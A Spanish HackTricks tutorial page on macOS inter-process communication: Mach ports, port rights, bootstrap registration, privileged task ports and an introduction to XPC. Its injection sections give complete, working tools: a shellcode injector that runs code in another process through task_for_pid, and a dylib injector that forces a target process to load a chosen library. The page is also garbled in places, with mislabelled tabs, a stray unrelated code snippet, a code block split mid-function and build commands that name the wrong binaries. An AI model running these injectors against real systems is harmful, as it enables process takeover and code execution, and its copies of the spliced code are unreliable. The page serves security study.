# macOS IPC - Comunicación entre Procesos

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Mensajería Mach a través de Puertos

Mach utiliza **tareas** como la **unidad más pequeña** para compartir recursos, y cada tarea puede contener **múltiples hilos**. Estas **tareas y hilos se mapean en procesos y hilos POSIX en una relación 1:1**.

La comunicación entre tareas se realiza a través de la Comunicación entre Procesos de Mach (IPC), utilizando canales de comunicación unidireccionales. Los **mensajes se transfieren entre puertos**, que actúan como **colas de mensajes** gestionadas por el kernel.

Los derechos de puerto, que definen las operaciones que una tarea puede realizar, son clave en esta comunicación. Los posibles **derechos de puerto** son:

* **Derecho de recepción**, que permite recibir mensajes enviados al puerto. Los puertos de Mach son colas MPSC (multiple-producer, single-consumer), lo que significa que solo puede haber **un derecho de recepción para cada puerto** en todo el sistema (a diferencia de las tuberías, donde varios procesos pueden tener descriptores de archivo para el extremo de lectura de una tubería).
* Una **tarea con el derecho de recepción** puede recibir mensajes y **crear derechos de envío**, lo que le permite enviar mensajes. Originalmente, solo la **propia tarea tiene el derecho de recepción sobre su puerto**.
* **Derecho de envío**, que permite enviar mensajes al puerto.
* El derecho de envío se puede **clonar** para que una tarea que posea un derecho de envío pueda clonar el derecho y **concedérselo a una tercera tarea**.
* **Derecho de envío único**, que permite enviar un mensaje al puerto y luego desaparece.
* **Derecho de conjunto de puertos**, que denota un _conjunto de puertos_ en lugar de un solo puerto. Desencolar un mensaje de un conjunto de puertos desencola un mensaje de uno de los puertos que contiene. Los conjuntos de puertos se pueden utilizar para escuchar varios puertos simultáneamente, de manera similar a `select`/`poll`/`epoll`/`kqueue` en Unix.
* **Nombre muerto**, que no es un derecho de puerto real, sino simplemente un marcador de posición. Cuando se destruye un puerto, todos los derechos de puerto existentes para el puerto se convierten en nombres muertos.

**Las tareas pueden transferir derechos de ENVÍO a otros**, lo que les permite enviar mensajes de vuelta. **Los derechos de ENVÍO también se pueden clonar, por lo que una tarea puede duplicar y dar el derecho a una tercera tarea**. Esto, combinado con un proceso intermediario conocido como el **servidor de arranque**, permite una comunicación efectiva entre tareas.

#### Pasos:

Como se menciona, para establecer el canal de comunicación, está involucrado el **servidor de arranque** (**launchd** en Mac).

1. La tarea **A** inicia un **nuevo puerto**, obteniendo un **derecho de RECEPCIÓN** en el proceso.
2. La tarea **A**, al ser la titular del derecho de RECEPCIÓN, **genera un derecho de ENVÍO para el puerto**.
3. La tarea **A** establece una **conexión** con el **servidor de arranque**, proporcionando el **nombre del servicio del puerto** y el **derecho de ENVÍO** a través de un procedimiento conocido como registro de arranque.
4. La tarea **B** interactúa con el **servidor de arranque** para ejecutar una **búsqueda de arranque para el servicio**. Si tiene éxito, el **servidor duplica el derecho de ENVÍO** recibido de la tarea A y **lo transmite a la tarea B**.
5. Al adquirir un derecho de ENVÍO, la tarea **B** es capaz de **formular** un **mensaje** y enviarlo **a la tarea A**.

El servidor de arranque **no puede autenticar** el nombre de servicio reclamado por una tarea. Esto significa que una **tarea** podría potencialmente **suplantar cualquier tarea del sistema**, como reclamar falsamente un nombre de servicio de autorización y luego aprobar cada solicitud.

Luego, Apple almacena los **nombres de los servicios proporcionados por el sistema** en archivos de configuración seguros, ubicados en directorios protegidos por SIP: `/System/Library/LaunchDaemons` y `/System/Library/LaunchAgents`. Junto a cada nombre de servicio, también se almacena el **binario asociado**. El servidor de arranque creará y mantendrá un **derecho de RECEPCIÓN para cada uno de estos nombres de servicio**.

Para estos servicios predefinidos, el **proceso de búsqueda difiere ligeramente**. Cuando se busca un nombre de servicio, launchd inicia el servicio dinámicamente. El nuevo flujo de trabajo es el siguiente:

* La tarea **B** inicia una **búsqueda de arranque** para un nombre de servicio.
* **launchd** verifica si la tarea se está ejecutando y, si no lo está, la **inicia**.
* La tarea **A** (el servicio) realiza un **registro de arranque**. Aquí, el servidor de arranque crea un derecho de ENVÍO, lo retiene y **transfiere el derecho de RECEPCIÓN a la tarea A**.
* launchd duplica el **derecho de ENVÍO y lo envía a la tarea B**.

Sin embargo, este proceso solo se aplica a las tareas predefinidas del sistema. Las tareas que no son del sistema aún funcionan como se describe originalmente, lo que podría permitir la suplantación.
### Ejemplo de código

Observa cómo el **receptor** **asigna** un puerto, crea un **derecho de envío** para el nombre `org.darlinghq.example` y lo envía al **servidor de inicio** mientras el receptor solicita el **derecho de envío** de ese nombre y lo utiliza para **enviar un mensaje**.

{% tabs %}
{% tab title="receptor.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <mach/mach.h>
#include <mach/message.h>

#define BUFFER_SIZE 1024

int main(int argc, char** argv) {
    mach_port_t server_port;
    kern_return_t kr;
    char buffer[BUFFER_SIZE];

    // Connect to the server port
    kr = task_get_special_port(mach_task_self(), TASK_AUDIT_PORT, &server_port);
    if (kr != KERN_SUCCESS) {
        printf("Failed to get server port: %s\n", mach_error_string(kr));
        return 1;
    }

    // Send a message to the server
    mach_msg_header_t* msg = (mach_msg_header_t*)buffer;
    msg->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
    msg->msgh_size = sizeof(buffer);
    msg->msgh_remote_port = server_port;
    msg->msgh_local_port = MACH_PORT_NULL;
    msg->msgh_reserved = 0;
    msg->msgh_id = 0;

    kr = mach_msg(msg, MACH_SEND_MSG, msg->msgh_size, 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    if (kr != KERN_SUCCESS) {
        printf("Failed to send message: %s\n", mach_error_string(kr));
        return 1;
    }

    return 0;
}
```
{% endtab %}

{% tab title="receiver.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{% endtab %}
{% endtabs %}

### Puertos privilegiados

* **Puerto del host**: Si un proceso tiene el privilegio de **enviar** a través de este puerto, puede obtener **información** sobre el **sistema** (por ejemplo, `host_processor_info`).
* **Puerto de privilegio del host**: Un proceso con el derecho de **enviar** a través de este puerto puede realizar acciones **privilegiadas** como cargar una extensión del kernel. El **proceso debe ser root** para obtener este permiso.
* Además, para llamar a la API **`kext_request`**, es necesario tener otros permisos **`com.apple.private.kext*`**, que solo se otorgan a los binarios de Apple.
* **Puerto del nombre de la tarea**: Una versión no privilegiada del _puerto de la tarea_. Hace referencia a la tarea, pero no permite controlarla. Lo único que parece estar disponible a través de él es `task_info()`.
* **Puerto de la tarea** (también conocido como puerto del kernel)**:** Con el permiso de enviar a través de este puerto, es posible controlar la tarea (leer/escribir memoria, crear hilos...).
* Llama a `mach_task_self()` para **obtener el nombre** de este puerto para la tarea del llamador. Este puerto solo se **hereda** a través de **`exec()`**; una nueva tarea creada con `fork()` obtiene un nuevo puerto de tarea (como caso especial, una tarea también obtiene un nuevo puerto de tarea después de `exec()` en un binario suid). La única forma de generar una tarea y obtener su puerto es realizar el ["baile de intercambio de puertos"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html) mientras se realiza un `fork()`.
* Estas son las restricciones para acceder al puerto (desde `macos_task_policy` del binario `AppleMobileFileIntegrity`):
* Si la aplicación tiene el permiso de **`com.apple.security.get-task-allow`**, los procesos del **mismo usuario pueden acceder al puerto de la tarea** (comúnmente agregado por Xcode para depurar). El proceso de **notarización** no lo permitirá en las versiones de producción.
* Las aplicaciones con el permiso **`com.apple.system-task-ports`** pueden obtener el **puerto de la tarea para cualquier** proceso, excepto el kernel. En versiones anteriores se llamaba **`task_for_pid-allow`**. Esto solo se otorga a las aplicaciones de Apple.
* **Root puede acceder a los puertos de tarea** de las aplicaciones **no** compiladas con un tiempo de ejecución **reforzado** (y no de Apple).

### Inyección de shellcode en un hilo a través del puerto de la tarea&#x20;

Puedes obtener un shellcode desde:

{% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}

{% tabs %}
{% tab title="mysleep.m" %}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{% tab title="entitlements.plist" %}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

**Compila** el programa anterior y agrega los **permisos** para poder inyectar código con el mismo usuario (si no, necesitarás usar **sudo**).

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector

#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
### Inyección de Dylib en un hilo a través del puerto de tarea

En macOS, los **hilos** pueden ser manipulados a través de **Mach** o utilizando la API de **pthread** de tipo **posix**. El hilo que generamos en la inyección anterior fue generado utilizando la API de Mach, por lo que **no es compatible con posix**.

Fue posible **inyectar un shellcode simple** para ejecutar un comando porque no era necesario trabajar con APIs compatibles con posix, solo con Mach. Inyecciones **más complejas** requerirían que el hilo también sea **compatible con posix**.

Por lo tanto, para **mejorar el hilo**, se debe llamar a **`pthread_create_from_mach_thread`**, que creará un pthread válido. Luego, este nuevo pthread podría **llamar a dlopen** para **cargar una dylib** del sistema, por lo que en lugar de escribir nuevo shellcode para realizar diferentes acciones, es posible cargar bibliotecas personalizadas.

Puedes encontrar **ejemplos de dylibs** en (por ejemplo, uno que genera un registro y luego puedes escucharlo):

{% content-ref url="../../macos-dyld-hijacking-and-dyld_insert_libraries.md" %}
[macos-dyld-hijacking-and-dyld\_insert\_libraries.md](../../macos-dyld-hijacking-and-dyld\_insert\_libraries.md)
{% endcontent-ref %}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}
```c
if (memcmp(possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
    memcpy(possiblePatchLocation, &addrOfPthreadCreate, 8);
    printf("Pthread create desde hilo mach @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
    printf("DLOpen @%llx\n", addrOfDlopen);
    memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
    strcpy(possiblePatchLocation, lib);
}
}

// Escribir el shellcode en la memoria asignada
kr = mach_vm_write(remoteTask,                   // Puerto de la tarea
                   remoteCode64,                 // Dirección virtual (Destino)
                   (vm_address_t) injectedCode,  // Origen
                   0xa9);                       // Longitud del origen

if (kr != KERN_SUCCESS)
{
    fprintf(stderr, "No se puede escribir en la memoria del hilo remoto: Error %s\n", mach_error_string(kr));
    return (-3);
}

// Establecer los permisos en la memoria asignada para el código del hilo remoto
kr = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
    fprintf(stderr, "No se pueden establecer los permisos de memoria para el código del hilo remoto: Error %s\n", mach_error_string(kr));
    return (-4);
}

// Establecer los permisos en la memoria asignada para la pila del hilo remoto
kr = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
    fprintf(stderr, "No se pueden establecer los permisos de memoria para la pila del hilo remoto: Error %s\n", mach_error_string(kr));
    return (-4);
}

// Crear hilo para ejecutar el shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64));

remoteStack64 += (STACK_SIZE / 2); // esta es la pila real
//remoteStack64 -= 8;  // se necesita alineación de 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf("Pila remota 64  0x%llx, el código remoto es %p\n", remoteStack64, p);

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
                           (thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT, &remoteThread);

if (kr != KERN_SUCCESS) {
    fprintf(stderr, "No se puede crear el hilo remoto: error %s", mach_error_string(kr));
    return (-3);
}

return (0);
}

int main(int argc, const char * argv[])
{
if (argc < 3)
{
    fprintf(stderr, "Uso: %s _pid_ _accion_\n", argv[0]);
    fprintf(stderr, "   _accion_: ruta a una dylib en el disco\n");
    exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat(action, &buf);
if (rc == 0) inject(pid, action);
else
{
    fprintf(stderr, "Dylib no encontrada\n");
}
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Secuestro de hilo a través del puerto de tarea <a href="#paso-1-secuestro-de-hilo" id="paso-1-secuestro-de-hilo"></a>

En esta técnica se secuestra un hilo del proceso:

{% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md" %}
[macos-thread-injection-via-task-port.md](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md)
{% endcontent-ref %}

## XPC

### Información básica

XPC, que significa Comunicación entre Procesos de XNU (el kernel utilizado por macOS), es un marco para la **comunicación entre procesos** en macOS e iOS. XPC proporciona un mecanismo para realizar **llamadas de método seguras y asíncronas entre diferentes procesos** en el sistema. Es parte del paradigma de seguridad de Apple, que permite la **creación de aplicaciones con privilegios separados** donde cada **componente** se ejecuta con **solo los permisos necesarios** para realizar su trabajo, limitando así el daño potencial de un proceso comprometido.

XPC utiliza una forma de Comunicación entre Procesos (IPC), que es un conjunto de métodos para que los programas diferentes que se ejecutan en el mismo sistema envíen datos de ida y vuelta.

